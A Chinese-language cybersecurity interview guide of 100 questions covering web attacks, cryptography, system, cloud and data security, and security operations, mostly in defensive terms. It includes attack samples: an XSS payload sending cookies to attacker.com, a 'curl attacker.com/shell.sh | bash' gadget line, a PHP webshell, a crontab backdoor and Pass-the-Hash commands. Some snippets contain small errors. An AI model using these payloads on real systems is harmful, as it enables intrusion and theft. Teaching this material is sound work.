# 网络安全100问——网络安全核心技术深度指南

> 本文档面向网络安全学习者，从入门到实战，包含高频面试题深度解析。
> 每个问题从「是什么」→「为什么」→「怎么实现的」「实际怎么用」四个维度讲解。

---

## 第一章 网络安全基础（高频 ★★★★★）

### 1. SQL注入是什么？

#### 1.1 定义

> 攻击者在Web应用的输入中嵌入恶意SQL语句，欺骗数据库执行未授权的操作。

```
原始SQL：
SELECT * FROM users WHERE name = '" + name + "'";

攻击输入：
' OR '1'='1

拼接后SQL：
SELECT * FROM WHERE name = '' OR '1'='1';
```

#### 1.2 回答模板

> SQL注入是Top 10 OWASP漏洞。将恶意SQL代码注入参数，导致数据泄露或破坏。预编译SQL是根本解决。

---

### 2. XSS是什么？

#### 2.1 定义

> Cross-Site Scripting跨站脚本攻击，注入恶意JS脚本到页面。

```html
<!-- 存储型XSS -->
<script>document.location='http://attacker.com?cookie='+document.cookie</script>
```

#### 2.2 类型

```
XSS类型：
- 反射型（非持久）
- 存储型（持久）
- DOM型
```

#### 2.3 回答模板

> XSS注入JS盗Cookie。会话劫持。输出编码+CSP是防御手段。

---

### 3. CSRF是什么？

#### 3.1 定义

> Cross-Site Request Forgery，伪造用户发请求。

```
攻击流程：
1. 用户登录bank.com
2. 访问attack.com（暗链）
3. 自动发送请求到bank.com/transfer?to=hacker&amount=10000
4. 用户cookie被利用
```

#### 3.2 防御

```
防御CSRF：
- CSRF Token
- SameSite Cookie
- 验证码
- 验证Referer
```

#### 3.3 回答模板

> CSRF伪造请求。Token是标准防御，SameSite是现代浏览器方案。

---

### 4. SSRF是什么？

#### 4.1 定义

> Server-Side Request Forgery服务端请求伪造。

```python
# 攻击目标内部系统
url = request.GET['url']
response = requests.get(url) # 攻击者可访问内部
```

#### 4.2 攻击

```plaintext
SSRF攻击：
- 探测内网
- 云元数据
- Redis未授权访问
- 本地端口扫描
```

#### 4.3 回答模板

> SSRF攻击内网。限制URL、白名单、内网禁用是防御。

---

### 5. XXE是什么？

#### 5.1 定义

> XML External Entity Injection XML外部实体注入。

```xml
<!-- 恶意payload -->
<!ENTITY xxe SYSTEM "file:///etc/passwd">
< >&xxe;
```

#### 5.2 防御

```java
// Java防御
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
```

#### 5.3 回答模板

> XXE读取文件。禁用DOCYPE声明是防御。

---

### 6. 暴力破解防御？

#### 6.1 定义

> brute-force穷举尝试密码。

```bash
hydra -L users.txt -P passwords.txt service://target
```

#### 6.2 防御

```plaintext
防暴力破解：
- 账户锁定（5次错误锁定）
- OTP/MFA
- Captcha验证码
- 登录日志监控
```

#### 6.3 回答模板

> 暴力破解防护：账户锁定+MFA+验证码。日志监控异常。

---

### 7. 中间人攻击MITM？

#### 7.1 定义

> Man-in-the-middle攻击者拦截通信。

```
Alice ──────▶ 攻击者 ──────▶ Bob
         窃听/篡改
```

#### 7.2 防御

```
MTIM防御：
- HTTPS
- 证书校验
- HSTS
- EV证书
```

#### 7.3 回答模板

> MITM拦截通信。强制HTTPS+HSTS防。

---

### 8. DDoS是什么？

#### 8.1 定义

> Distributed Denial of Service分布式拒绝服务。

```
DDoS类型：
- 流量型（NTP/SSDP flood）
- 连接型（SYN flood）
- 应用层（HTTP flood）
```

#### 8.2 缓解

```plaintext
DDoS缓解：
- 流量清洗
- CDN分流
- 黑洞路由
- 限速
- Anycast
```

#### 8.3 回答模板

> DDoS洪水攻击。高防IP/流量清洗/CDN防护。

---

### 9. WAF是什么？

#### 9.1 定义

> Web Application FirewallWeb应用防火墙。

```
WAF功能：
- SQL注入检测
- XSS检测
- CSRF防护
- 规则定制
```

#### 9.2 部署

```plaintext
WAF部署：
- 硬件WAF
- 软件WAF（ModSecurity）
- 云WAF（阿里云/腾讯云）
- Reverse Proxy
```

#### 9.3 回答模板

> WAF检测阻断Web攻击。ModSecurity开源。云WAF省维护。

---

### 10. IDS/IPS是什么？

#### 10.1 定义

> Intrusion Detection System / Prevention System

```
IDS：检测告警
IPS：检测+阻断
```

#### 10.2 类型

```
检测类型：
- 签名检测（已知攻击）
- 异常检测（行为基线）
- 状态检测（协议状态）
```

#### 10.3 回答模板

> IDS/IPS是网络层威胁检测。签名库+NIDS。

---

## 第二章 加密与认证（高频 ★★★★★）

### 11. 对称加密vs非对称加密？

#### 11.1 对称加密

```python
# 对称：AES/3DES
# 加密key = 解密key
# 快，用于大量数据
```

#### 11.2 非对称加密

```python
# 非对称：RSA/ECC
# 公钥加密，私钥解密
# 慢，用于密钥交换/签名
```

#### 11.3 回答模板

> 对称加密快，非对称用来安全传递对称密钥。SSL/TLS两者结合。

---

### 12. RSA加密原理？

#### 12.1 原理

```
RSA基于大数分解难度：
- 选两个大素数p,q
- n = p * q
- φ(n) = (p-1)(q-1)
- 取公钥e，私钥d满足 ed ≡ 1 (mod φ(n))
- 加密：c = m^e mod n
- 解密：m = c^d mod n
```

#### 12.2 密钥长度

```plaintext
RSA密钥长度：
- 1024（不安全）
- 2048（安全）
- 4096（高安全）
```

#### 12.3 回答模板

> RSA基于大数分解。2048位是现在安全标准。量子计算机可破。

---

### 13. 哈希算法？

#### 13.1 Hash

```python
# MD5（不安全）
# SHA-1（不安全）
# SHA-256（安全）
# SHA-3
```

#### 13.2 彩虹表

```
彩虹表反查Hash：
- 预设Hash表
- 反查原文
```

```
防御：
- Salt加盐
- bcrypt/scrypt（慢哈希）
```

#### 13.3 回答模板

> Hash单向不可逆。MD5/MD6不安全。用Salt+bcrypt防彩虹表。

---

### 14. 数字签名？

#### 14.1 原理

```
签名流程：
1. 计算消息Hash
2. 用私钥加密Hash = 签名
3. 接收方用公钥解密，比较Hash
```

#### 14.2 类型

```
签名类型：
- RSA签名
- DSA（Digital Signature Algorithm）
- ECDSA
- EdDSA
```

#### 14.3 回答模板

> 数字签名证明身份。用私钥签名，公钥验证。保证完整性。

---

### 15. 证书与PKI？

#### 15.1 数字证书

```
证书内容：
- 公钥信息
- 身份信息
- 签发机构（CA）
- 有效期
- 序列号
- CA数字签名
```

#### 15.2 证书链

```
证书链验证：
Leaf → Intermediate CA → Root CA → 内置信任根
```

#### 15.3 回答模板

> 证书PKI体系。浏览器内置根证书。云Cloudflare免费证书。

---

### 16. TLS/SSL握手过程？

#### 16.1 握手

```
TLS握手：
1. ClientHello →
2. ← ServerHello + 证书 + 选算法
3. Client Key Exchange（PremasterSecret）
4. Finished →
5. ← Finished
6. 应用数据加密
```

#### 16.2 回答模板

> TLS握手协商算法、验证证书、交换密钥。随后加密通信。

---

### 17. HTTPS如何工作？

#### 17.1 实现

```
HTTPS = HTTP over TLS
- 端口443
- 证书认证
- 数据加密
- 完整性
```

#### 17.2 HTTP vs HTTPS

```plaintext
对比：
HTTP：明文，无身份，无加密
HTTPS：加密+身份+完整性
```

#### 17.3 回答模板

> HTTPS用TLS加密。TLS 1.3是目前最新版。

---

### 18. JWT(JSON Web Token)？

#### 18.1 结构

```json
JWT = Header.Payload.Signature
// Header:算法
// Payload:声明
// Signature:RSA(HMAC)签名
```

#### 18.2 安全

```json
Payload // 注意公开声明可读
{
  "sub": "1234567890",
  "name": "John Doe",
  "admin": true
}
```

#### 18.3 回答模板

> JWT无状态认证。签名防篡改。Header/Payload可Base64解码。

---

### 19. OAuth 2.0？

#### 19.1 流程

```
OAuth2：
1. Client→Authorization Server
2. 用户确认
3. Auth Server→Code
4. Client→Token
5. 资源服务器验Token
```

#### 19.2 grant

```plaintext
OAuth流程：
- Authorization Code（Web）
- Implicit（SPA/Mobile）
- Client Credentials（Service）
- Password Credentials（trusted client）
```

#### 19.3 回答模板

> OAuth2是授权标准。OAuth2+OpenID Connect = OIDC。

---

### 20. Session vs Token？

#### 20.1 Session

```http
# 服务端存储Session
Set-Cookie: sessionId=xxx; HttpOnly
```

#### 20.2 Token

```http
# 无状态Token
Authorization: Bearer <token>
```

#### 20.3 对比

```plaintext
Session vs Token：
- Session服务端存，有状态
- Token无状态，可扩展
- Session有过期，Token expires
```

---

## 第三章 Web安全（高频 ★★★★★）

### 21. 认证与授权的区别？

#### 21.1 Authentication

```
Who are you? 你是谁
验证身份（登录）
```

#### 21.2 Authorization

```
What can you do? 你能做什么
权限控制（RBAC/ABAC）
```

#### 21.3 回答模板

> 认证验证身份，授权分配权限。结合起来是完整的安全体系。

---

### 22. 零信任安全？

#### 22.1 Zero Trust

> Never Trust, Always Verify永不信任，始终验证。

```
原则：
- 永不相信（Always verify）
- 假定有威胁（Assume breach）
- 最小权限（Least privilege）
```

#### 22.2 实现

```plaintext
Zero Trust：
- 身份验证（每一次访问）
- 微分段网络
- 设备信任评估
- 持续自适应认证
```

#### 22.3 回答模板

> 零信任：不信任内网，检查每一次请求。Google BeyondCorp。

---

### 23. RCE远程代码执行？

#### 23.1 定义

> Remote Code Execution执行任意代码。

```
常见RCE：
- 反序列化漏洞
- 命令注入
- 文件包含
```

#### 23.2 防御

```plaintext
防御RCE：
- 输入过滤
- 禁用危险函数
- 最小化权限
- 安全配置
```

#### 23.3 回答模板

> RCE是最严重漏洞，可 Getshell。最小权限+输入校验防护。

---

### 24. 反序列化漏洞？

#### 24.1 JAVA反序列化

```java
// 危险
ObjectInputStream ois = new ObjectInputStream(input);
Object obj = ois.readObject();
```

#### 24.2 攻击

```java
// Gadget chain
Runtime.getRuntime().exec("curl attacker.com/shell.sh | bash");
```

#### 24.3 回答模板

> 反序列化用Apache Commons Collections/Gadgets。禁止不受控的readObject。

---

### 25. 文件上传漏洞？

#### 25.1 定义

```php
// PHP Webshell
<?php system($_GET['cmd']); ?>
```

#### 25.2 防御

```python
# 防御
- 文件类型白名单
- 重命名
- 内容检测
- 单独域名存储
```

#### 25.3 回答模板

> Webshell可执行命令。白名单+重命名+内容检测+隔离存储。

---

### 26. 文件包含漏洞？

#### 26.1 本地包含LFI

```php
include $_GET['page'] . '.php';
// ../../etc/passwd
```

#### 26.2 远程包含RFI

```php
// http://attacker.com/shell.txt
```

#### 26.3 回答模板

> 禁用远程URL包含。路径校验。basepath+"/"+page。

---

### 27. 命令注入？

#### 27.1 定义

```python
# 危险
os.system("ping " + ip)
# 攻击: 127.0.0.1; cat /etc/passwd
```

#### 27.2 防御

```python
# 防御
subprocess.run(["ping", ip])
# 绝对不允许命令拼接
```

#### 27.3 回答模板

> 命令注入用分号注入命令。subprocess参数化，禁止shell=True。

---

### 28. 认证绕过手段？

#### 28.1 方式

```plaintext
认证绕过：
- SQL注入绕过登录
- 空密码
- 默认口令
- Session_FIXation
- Cookie伪造
```

#### 28.2 防御

```
防御：
- 多因素认证
- 安全认证流程
- 审计日志
```

---

### 29. 越权访问？

#### 29.1 定义

> 垂直越权：普通→管理员

> 水平越权：A用户→B用户数据

```http
# 水平越权
GET /api/user/123 → 修改为456
```

#### 29.2 防御

```java
// 检查权限
if (!currentUser.canAccess(target)) {
    throw new ForbiddenException();
}
```

---

### 30. 敏感信息泄露？

#### 30.1 场景

```plaintext
敏感信息：
- 日志打印敏感数据
- 返回敏感字段
- 错误信息泄露
- Git信息泄露
```

#### 30.2 防御

```java
// Logback排除Sensitive
<pattern>%d{HH:mm:ss.SSS} [%thread] %-5level %logger{36} - %msg%n</pattern>
```

---

## 第四章 系统安全（高频 ★★★★★）

### 31. 缓冲区溢出？

#### 31.1 定义

> Buffer Overflow覆盖相邻内存。

```
栈溢出：
- 返回地址覆盖
- Shellcode注入
- DEP/NX禁用可执行内存
```

#### 31.2 防御

```
防御：
- 编译器保护（Stack canary）
- DEP/NX（不可执行内存）
- ASLR（地址随机化）
- 输入边界检查
```

#### 31.3 回答模板

> 缓冲区溢出可执行恶意代码。现代OS有DEP/ASLR保护。

---

### 32. ROOTKIT？

#### 32.1 定义

> Rootkit是持久化后门。

```
类型：
- 应用级Rootkit
- 内核级Rootkit
- 固件Rootkit
```

#### 32.2 检测

```bash
# 检测
chkrootkit
rkhunter
clamav
```

---

### 33. 提权漏洞？

#### 33.1 本地提权

```bash
# Dirty COW CVE-2016-5195
dirtycow poc
# 写入/etc/passwd
```

#### 33.2 防御

```
防御：
- 最新补丁
- 最小权限
- SELinux/AppArmor
- 内核加固
```

---

### 34. 权限维持Persistence？

#### 34.1 Windows

```reg
# 注册表自启
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
```

#### 34.2 Linux

```bash
# crontab后门
* * * * * /tmp/backdoor
# SSH key
~/.ssh/authorized_keys
```

---

### 35. 横向渗透？

#### 35.1 局域网漫游

```bash
# 探测内网
nbtscan 192.168.1.0/24
# Pass-the-Hash
pth-winexe //192.168.1.10 cmd
```

#### 35.2 攻击链

```plaintext
ATT&CK攻击链：
Initial Access → Execution → Persistence → Lateral Movement → Collection → Exfiltration
```

---

### 36. 应急响应流程？

#### 36.1 流程

```
1. 确认事件
2. 隔离止损
3. 调查取证
4. 清除后门
5. 复盘加固
```

#### 36.2 取证

```bash
# 内存Dump
winpmem_mini_x64.exe memory.raw
# 硬盘镜像
dc3dd if=/dev/sda of=image.raw
```

---

### 37. 日志分析？

#### 37.1 Windows

```
Windows日志：
- Security.evtx 登录/权限
- System.evtx 系统
- Application.evtx 应用
```

#### 37.2 Linux

```bash
/var/log/secure   # 认证
/var/log/messages # 系统
/var/log/nginx/access.log
```

---

### 38. APT攻击？

#### 38.1 高级持续性威胁

```plaintext
APT特征：
- 长期潜伏
- 高度隐蔽
- 有国家背景
- 目标性强
```

#### 38.2 防御

```plaintext
APT防御：
- 威胁情报
- 流量检测
- 异常检测
- UEBA
```

---

### 39. 密码学应用？

#### 39.1 加密存储密码

```python
# 密码Hash
import bcrypt
hashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt())
```

#### 39.2 对称加密文件

```python
# Fernet对称加密
from cryptography.fernet import Fernet
cipher = Fernet(key)
encrypted = cipher.encrypt(data)
```

---

### 40. 安全开发生命周期SDL？

#### 40.1 SDL流程

```
SDL阶段：
1. 培训
2. 要求
3. 设计
4. 实现
5. 验证6. Release
7. 响应
```

#### 40.2 DevSecOps

```yaml
# CI集成安全
- SAST: SonarQube
- SCA: Dependency-Check
- DAST: ZAP
- 容器: Trivy
```

---

## 第五章 网络安全防护（高频 ★★★★★）

### 41. 防火墙规则？

#### 41.1 iptables

```bash
# 默认拒绝
iptables -P INPUT DROP
iptables -P FORWARD DROP
# 允许已建立的
iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
# 允许SSH
iptables -A INPUT -p tcp --dport 22 -j ACCEPT
```

#### 41.2 回答模板

> 生产防火墙：默认拒绝。白名单放行。允许ESTABLISHED。

---

### 42. 入侵检测系统？

#### 42.1 Snort规则

```
alert tcp any any -> any 80 (msg:"SQL Injection"; content:"' or '1'='1"; sid:100001;)
```

#### 42.2 Suricata

```
# IDS engine
suricata -c suricata.yaml -i eth0
```

---

### 43. 安全隔离？

#### 43.1 网络分区

```
DMZ：
- Web防火墙后面
- 对外服务
- 不能访问内网
```

#### 43.2 VLAN隔离

```
网络隔离：
- DMZ区（Web）
- 办公区
- 核心业务区
- 管理区
```

---

### 44. 代码审计工具？

#### 44.1 静态分析

```bash
# SonarQube
mvn sonar:sonar
# Semgrep
semgrep --lang python --config auto .
```

#### 44.2 回答模板

> SAST工具：SonarQube查Bug，Semgrep查安全漏洞。

---

### 45. 漏洞管理？

#### 45.1 CVSS评分

```
CVSS基础分数：
- Attack Vector (AV)
- Attack Complexity (AC)
- Privileges Required (PR)
- User Interaction (UI)
- Scope (S)
- Confidentiality (C)
- Integrity (I)
- Availability (A)
```

#### 45.2 评分

```plaintext
评分等级：
Critical: 9.0-10.0
High: 7.0-8.9
Medium: 4.0-6.9
Low: 0.1-3.9
None: 0.0
```

---

### 46. 渗透测试Pentest？

#### 46.1 PTES步骤

```
渗透测试：
1. 信息收集
2. 威胁建模
3. 漏洞分析
4. 渗透攻击
5. 后渗透
6. 报告
```

#### 46.2 工具

```
工具链接：
- Information: Nmap
- Vulnerability: Nessus/OpenVAS
- Exploitation: Metasploit
- Web: BurpSuite/ZAP
```

---

### 47. 红蓝对抗？

#### 47.1 Red Team vs Blue Team

```
Red（红队）：
- 进攻
- 模拟APT
- 找突破口

Blue（蓝队）：
- 防守
- 检测响应
- 研判分析
```

#### 47.2 Purple Team

```
Purple = Red + Blue + 实时协作
```

---

### 48. 威胁建模STRIDE？

#### 48.1 STRIDE

```
Spoofing 伪造
Tampering 篡改
Repudiation 抵赖
Information Disclosure 信息泄露
Denial of Service 拒绝服务
Elevation of Privilege 越权
```

#### 48.2 DFD建模

```
Data Flow Diagram建模：
- Processes
- Data stores
- Data flows
- External entities
```

---

### 49. 安全加固？

#### 49.1 Linux加固

```
加固：
- SSH禁止密码+root
- 防火墙iptables
- SELinux enforcing
- 禁用ICMP
- 日志审计
```

#### 49.2 Windows加固

```
Win加固：
- 组策略
- 防火墙
- Windows Defender
- BitLocker
- WSUS补丁
```

---

### 50. 恶意软件检测？

#### 50.1 病毒特征

```
特征码检测：
- 文件Hash（MD5/SHA1）
- 网络特征
- 行为特征
- YARA规则
```

#### 50.2 检测

```bash
# ClamAV 查毒
clamscan -r /home
# YARA规则
yararules rules.yar /tmp/
```

---

## 第六章 应用安全（高频 ★★★★★）

### 51. Cookie安全？

#### 51.1 属性

```http
Set-Cookie: session=xxx; HttpOnly; Secure; SameSite=Lax; Path=/;
```

#### 51.2 解释

```
HttpOnly: JS不可读
Secure: 仅HTTPS
SameSite: CSRF防护
Path: 路径限制
```

---

### 52. CSP内容安全策略？

#### 52.1 CSP header

```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com; style-src 'self'; img-src 'self' data:;
```

#### 52.2 指令

```
default-src 默认
script-src JS
style-src CSS
img-src 图片
connect-src AJAX/WebSocket
font-src 字体
```

---

### 53. HTTPS升级/HSTS？

#### 53.1 HSTS

```http
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
```

#### 53.2 作用

```
HSTS：
- 强制HTTPS
- 阻止降级攻击
- 预加载浏览器内置列表
```

---

### 54. CORS跨域？

#### 54.1 跨域请求

```http
Access-Control-Allow-Origin: https://example.com
Access-Control-Allow-Methods: GET, POST
Access-Control-Allow-Headers: Authorization
Access-Control-Allow-Credentials: true
```

#### 54.2 安全

```
���制���：
- 不使用*
- 白名单
- 验证Origin
```

---

### 55. JSON安全？

#### 55.1 JSON Hijacking

```javascript
// 覆盖数组构造函数
Array = function() {}
// 回调函数
callback({"data": "secret"})
```

#### 55.2 防御

```
防御：
- WAF检测
- CSRF Token
- 验证origin
```

---

### 56. Samesite Cookie机制？

#### 56.1 属性

```http
SameSite=Strict   // 完全禁止跨站
SameSite=Lax     // GET允许跨站
SameSite=None    // 允许跨站（需Secure）
```

#### 56.2 回答模板

> SameSite是现代浏览器的CSRF防护。 Lax适合大部分，Strict适合敏感操作。

---

### 57. 密码存储最佳实践？

#### 57.1 加密存储

```python
import bcrypt
hashpw = bcrypt.hashpw(password.encode(), bcrypt.gensalt())
valid = bcrypt.checkpw(password.encode(), hashpw)
```

#### 57.2 Argon2

```python
# Argon2 winner
import argon2
h = argon2.PasswordHasher(time_cost=3,memory_cost=64*1024)
hash = h.hash(password)
```

---

### 58. 会话管理最佳实践？

#### 58.1 会话安全

```java
// 安全配置
session.setAttribute("SSL_TRACK", SessionTrackingMode.SSL);
session.setSecure(true);
session.setHttpOnly(true);
session.setMaxInactiveInterval(1800);
```

#### 58.2 失效

```
会话失效：
- 超时logout
- IP变化
- UA变化
- 重新登录
```

---

### 59. 日志注输攻击？

#### 59.1 Log Injection

```python
# 日志注入换行
\log.info(request.params.get('msg'))
# 输入\nJan 1 root - CMD
```

#### 59.2 防御

```
防御：
- 输入过滤
- 日志转义
- 单独日志存储
```

---

### 60. HTML过滤？

#### 60.1 XSS过滤

```java
import org.apache.commons.text.StringEscapeUtils;
StringEscapeUtils.escapeHtml4(input);
```

#### 60.2 Library

```
HTML净化库：
- OWASP Java HTML Sanitizer
- DOMPurify
- sanitize-html
```

---

## 第七章 云安全（中高级 ★★★★）

### 61. 云安全责任共担？

#### 61.1 Model

```
Cloud安全模式：
- IaaS: Provider负责虚拟化，用户负责OS+
- PaaS: Provider增加runtime
- SaaS: Provider全责
```

#### 61.2 回答模板

> 云安全是责任共担。厂商负责云安全，客户负责云上安全。

---

### 62. 云服务常见漏洞？

#### 62.1 问题

```
云漏洞：
- 配置错误（IAM/S3）
- 凭证泄露
- 过度权限
- 元数据API
```

#### 62.2 AWS

```
AWS安全：
- 账号安全 IAM
- S3 桶权限
- CloudTrail 日志
```

---

### 63. 容器安全？

#### 63.1 Container

```
容器安全：
- 镜像漏洞扫描（Trivy）
- 最小基础镜像
- 非root用户- 只读文件系统
- 资源限制
```

#### 63.2 Container

```dockerfile
# 安全Dockerfile
FROM alpine
RUN addgroup -S app && adduser -S app -G app
USER app
readOnly: true
```

---

### 64. K8S安全？

#### 64.1 K8S Network

```yaml
# NetworkPolicy
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: deny-default
spec:
  podSelector: {}
  policyTypes:
  - Ingress
  - Egress
```

#### 64.2 回答模板

> K8S安全：RBAC、NetworkPolicy、PodSecurityPolicy、Secrets加密存储。

---

### 65. 密钥管理？

#### 65.1 Vault

```bash
# HashiCorp Vault
vault kv put secret/db username=admin password=pass123
vault token create -policy=myapp -ttl=1h
```

#### 65.2 云KMS

```
云KMS：
- AWS KMS
- Azure Key Vault
- GCP Cloud KMS
```

---

## 第八章 数据安全（中高 ★★★★）

### 66. 数据脱敏？

#### 66.1 Masking

```sql
-- 掩码
SELECT
    name,
    CONCAT(LEFT(email,2),'***','@***.com') as email,
    SUBSTR(phone,1,3)||'****'||RIGHT(phone,4) as phone
FROM users;
```

#### 66.2 方法

```plaintext
脱敏类型：
- 掩码（Masking）
- 替换（Substitution）
- 泛化（Generalization）
- 扰乱（Fuzzing）
```

---

### 67. 数据加密分类？

#### 67.1 加密级别

```plaintext
加密级别：
- 传输加密（TLS）
- 存储加密（Encryption at Rest）
- 数据库加密（TDE）
- 列加密（Column Encryption）
```

#### 67.2 回答模板

> 数据需要多层加密：传输、存储、数据库、敏感字段。

---

### 68. GDPR数据保护？

#### 68.1 要求

```
GDPR权利：
- 删除权（被遗忘权）
- 数据可携权
- 访问权
- 更正权
```

#### 68.2 处罚

```
GDPR罚款：
- 最高全球营业额4%
- 或2000万欧元
```

---

### 69. 数据备份安全？

#### 69.1 备份加密

```bash
# 备份加密
gpg --symmetric --cipher-algo AES256 backup.tar.gz
# 备份到异地
rsync -avz --delete backup/ remote:/backup/
```

#### 69.2 回答模板

> 备份需要加密+异地+版本化。和主数据一样重要。

---

### 70. 密钥轮换？

#### 70.1 Rotation

```
密钥轮换：
- 每年/季轮换
- 旧密钥归档
- 紧急撤销失效
```

#### 70.2 自动轮换

```
自动轮换：
- AWS KMS自动轮换
- 数据库TDE自动轮换
```

---

## 第九章 身份与访问管理（中高级 ★★★★）

### 71. SSO单点登录？

#### 71.1 SAML

```
SAML断言：
- Issuer（签发者）
- Subject（主体）
- Conditions（条件）
- Attribute Statement（属性）
```

#### 71.2 WS-Federation

```
WS-Fed：
- 微软生态ADFS
- 请求安全令牌
- Claims
```

---

### 72. LDAP安全？

#### 72.1 LDAPS

```bash
# 启用LDAPS
# 使用SSL/TLS 636端口
```

#### 72.2 绑定

```
LDAP身份验证：
- Simple bind
- SASL (Kerberos)
- Certificate
```

---

### 73. MFA？

#### 73.1 多因素

```plaintext
MFA因素：
- 知道的（密码）
- 拥有的（手机/硬件token）
- 本身的（指纹/FaceID）
```

#### 73.2 TOTP

```
TOTP时间base：
- 6位数字
- 30秒滚动
- Google Authenticator/Authy
```

---

### 74. RBAC？

#### 74.1 基于角色

```sql
-- 角色表设计
CREATE TABLE user_roles (
    user_id INT,
    role_id INT,
    PRIMARY KEY(user_id, role_id)
);
CREATE TABLE role_permissions (
    role_id INT,
    permission_id INT
);
```

#### 74.2 ABAC

```
ABAC：
- 基于属性
- 更细粒度
- 动态策略Time/Loc/IP
```

---

### 75. PAM？

#### 75.1 特权访问

```
PAM原则：
- 最小特权
- 即时使用
- 审计记录
- 票据方式
```

#### 75.2 工具

```
商业PAM：
- CyberArk
- Thycotic
- 腾讯云堡垒机
```

---

### 76. 零信任网络ZTNA？

#### 76.1 定义

> Zero Trust Network Access：软件定义的边界。

```
ZTNA：
- 应用/微分段
- 所有人验证
- 基于身份
- 不可知网络
```

---

### 77. 硬件密钥？

#### 77.1 YubiKey

```bash
# FIDO2/U2F
authenticator credential-create --user=user
```

#### 77.2 回答模板

> YubiKey是硬件第二因素。防止钓鱼。

---

### 78. OAuth安全？

#### 78.1 安全注意事项

```
OAuth安全：
- state参数防CSRF
- redirect_uri验证
- code换token安全
- PKCE扩展
```

#### 78.2 回答模板

> OAuth注意state参数和redirect_uri验证。PKCE增强安全。

---

### 79. 身份联合？

#### 79.1 Identity Federation

```
跨域身份：
- SAML IdP
- OIDC Provider
- Social Login (Google/Facebook)
```

#### 79.2 回答模板

> 身份联合支持跨域单点登录。

---

### 80. 账户解锁策略？

#### 80.1 锁定

```
锁定策略：
- 5次错误锁定
- 30分钟自动解锁
- 管理员解锁
- Admin验证码解锁
```

---

## 第十章 安全运营（中高级 ★★★★）

### 81. SIEM？

#### 81.1 定义

> Security Information and Event Management

```
SIEM：
- 日志收集
- 关联分析
- 告警
- 报告
```

#### 81.2 产品

```
SIEM产品：
- Splunk
- Elastic
- QRadar
- Aliyun SLS
```

---

### 82. SOC？

#### 82.1 安全运营中心

```
SOC服务：
- 监控
- 事件响应
- 威胁分析
- 威胁狩猎
- 漏洞扫描
```

#### 82.2 流程

```
流程：
监测 → 分析 → 确认 → 响应 → 恢复 → 复盘
```

---

### 83. 威胁情报Threat Intelligence？

#### 83.1 CTI

```
威胁情报：
- IOC指标（IP/域名/hash）
- TTP战技术（战术技术）
- 战略情报
```

#### 83.2 共享

```
STIX/TAXII情报标准：
- STIX图形描述
- TAXII传输
- MISP开源
```

---

### 84. 漏洞扫描？

#### 84.1 扫描器

```bash
# Nessus全面扫描
nessuscli scan new -name web-scan -t 192.168.1.10 -p plugin_family:web_application
# OpenVAS开源
omp -h target -p 9390 -u admin -w password -F
```

#### 84.2 回答模板

> Web漏扫：Nessus/Acunetix。主机漏扫：Nessus/OpenVAS。

---

### 85. 代码安全审计？

#### 85.1 SAST

```bash
# SonarQube
mvn clean verify sonar:sonar
# Checkmarx
cxquick -projectName MyApp -location ../src -preset All
```

#### 85.2 回答

> SAST静态分析是源代码审查。在CI中Gate集成。

---

### 86. 渗透测试类型？

#### 86.1 类型

```
测试类型：
- White-box（白盒）全源码
- Black-box（黑盒）仅URL
- Gray-box（灰盒）部分信息
```

#### 86.2 标准

```
PTES渗透测试执行标准：
- Pre-engagement Interactions
- Intelligence Gathering
- Threat Modeling
- Vuln Analysis
- Exploitation
- Reporting
```

---

### 87. 事件响应IR准备？

#### 87.1 准备

```
IR准备：
- IRP事件响应计划
- 应急联系
- 取证工具
- 隔离环境
- 演练
```

#### 87.2 响应

```
响应程序：
Detect → Contain → Eradicate → Recover → Post-Incident
```

---

### 88. 取证和保全？

#### 88.1 取证

```
取证：
- 内存Dump（WinPmem/LiME）
- 硬盘镜像（DC3DD）
- 日志保护
- Chain of Custody证据链
```

#### 88.2 工具

```
取证工具：
- Autopsy（WINDOWS）
- Sleuth Kit
- Volatility（内存）
- Cado Forensics
```

---

### 89. 企业安全架构？

#### 89.1 架构

```plaintext
安全架构：
- 边界安全（Firewall/WAF）
- 网段安全（VLAN/ACL）
- 主机安全（Hardening/EDR）
- 应用安全（Secure SDLC）
- 身份安全（IAM/MFA）
- 数据安全（DLP/加密）
```

#### 89.2 框架

```
框架选择：
- NIST CSF
- ISO 27001
- PCI DSS
- SOC 2
```

---

### 90. 合规要求？

#### 90.1 法规

```
中国法规：
- 网络安全法
- 数据安全法
- 个人信息保护法
- 等保2.0
```

#### 90.2 等保

```
等保2.0：
- 5个级别
- 10个区域
- 关键系统需三级+
```

---

### 91. 渗透测试报告撰写？

#### 91.1 内容

```markdown
# 渗透测试报告
## Executive Summary
## Scope
## Methodology
## Findings
   - Critical
   - High
   - Medium
   - Low
## Remediation Recommendations
## Conclusion
```

---

### 92. 安全_metrics有哪些？

#### 92.1 KPI

```plaintext
指标：
- MTTD (Mean Time To Detect)
- MTTR (Mean Time To Respond)
- MTTC (Mean Time To Contain)
- 漏洞平均修复时间
```

---

### 93. 安全事件分类？

#### 93.1 P1-P4

```
等级：
- P1 重大（核心业务受影响）
- P2 紧急（有影响）
- P3 一般（部分）
- P4 提示（改进��
```

---

### 94. 漏洞披露？

#### 94.Responsible Disclosure

```
合理披露：
- 发现者报告厂商
- 给予修复时间（90天）
- 公开细节需协商
- 过期后公布
```

---

### 95. Bounty赏金计划？

#### 95.1 漏洞赏金

```
平台：
- HackerOne
- Bugcrowd
- 安全厂商应急响应(sv)
```

---

### 96. 安全认证？

#### 96.1 认证

```
认证：
- ISO 27001
- SOC 2 Type II
- CISSP
- CISP
- CEH
```

---

### 97. 安全事件演练？

#### 97.1 演练

```
桌面演练 TDTT：
- 模拟事件
- 讨论响应
- 不执行实际操作
```

---

### 98. 密码最佳实践？

#### 98.1 策略

```
标准：
- 12+长度
- 复杂度
- 不重放
- MFA
- 定期更换（可选）或不更换（推荐）
```

---

### 99. 社会工程学？

#### 99.1 鱼叉攻击

```
Phishing类型：
- Email Phishing（邮件）
- Spear Phishing（定向）
- Whaling（CEO/高管）
- Smishing（短信）
- Vishing（语音）
```

#### 99.2 培训

```
防范：
- 安全培训
- 钓鱼演练
- 口令确认
```

---

### 100. 安全的未来趋势？

#### 100.1 趋势

```plaintext
趋势：
- AI安全（AIGC安全）
